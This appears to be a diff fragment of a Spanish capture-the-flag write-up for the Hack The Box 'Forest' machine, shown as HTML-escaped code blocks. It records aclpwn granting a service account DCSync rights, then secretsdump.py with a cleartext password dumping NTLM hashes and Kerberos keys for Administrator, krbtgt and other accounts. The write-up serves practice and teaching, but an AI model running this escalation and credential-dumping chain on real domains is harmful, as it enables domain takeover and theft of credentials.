+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/tools/aclpwn.py# aclpwn -f svc-alfresco -ft user -t htb.local -tt domain -d htb.local -dry -du neo4j -dp toor
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Path found!
+Path &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SVC-ALFRESCO@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SERVICE ACCOUNTS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PRIVILEGED IT ACCOUNTS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ACCOUNT OPERATORS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;GenericAll&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WriteDacl&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Unsupported operation: GetChanges on HTB.LOCAL &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Invalid path, skipping
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Path found!
+Path &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SVC-ALFRESCO@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SERVICE ACCOUNTS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PRIVILEGED IT ACCOUNTS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ACCOUNT OPERATORS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;GenericAll&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WriteDacl&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Please choose a path &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0-1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Path validated, the following modifications are required &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; exploitation in the current configuration:
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Adding user SVC-ALFRESCO to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Modifying domain DACL to give DCSync rights to SVC-ALFRESCO
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2022.23.11.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@kali:~/tools/impacket/examples# aclpwn -f svc-alfresco -ft user -t htb.local -tt domain -d htb.local -du neo4j -dp toor -s 10.10.10.161
+Please supply the password or LM:NTLM hashes of the account you are escalating from: 
+[+] Path found!
+Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-&amp;gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-&amp;gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-&amp;gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-&amp;gt;(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]-&amp;gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-&amp;gt;(HTB.LOCAL)
+[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)
+[-] Invalid path, skipping
+[+] Path found!
+Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-&amp;gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-&amp;gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-&amp;gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-&amp;gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-&amp;gt;(HTB.LOCAL)
+Please choose a path [0-1] 1
+[-] Memberof -&amp;gt; continue
+[-] Memberof -&amp;gt; continue
+[-] Memberof -&amp;gt; continue
+[-] Adding user SVC-ALFRESCO to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
+[+] Added CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local as member to CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
+[-] Re-binding to LDAP to refresh group memberships of SVC-ALFRESCO@HTB.LOCAL
+[+] Re-bind successful
+[-] Modifying domain DACL to give DCSync rights to SVC-ALFRESCO
+[+] Dacl modification successful
+[+] Finished running tasks
+[+] Saved restore state to aclpwn-20191130-014547.restore
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-30%2000.46.34.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Ahora que que tenemos permisos DCSync podemos utilizar secretsdump.py para obtener los hash de los usuarios.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/tools/impacket# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
+Impacket v0.9.21-dev - Copyright &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; SecureAuth Corporation
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping Domain Credentials &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;id:rid:lmhash:nthash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
+htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ndy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;anti:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:179967e72ed1faea7d8de2f3c2b5d003:::
+EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
+krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
+krbtgt:des-cbc-md5:9dd5647a31518ca8
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
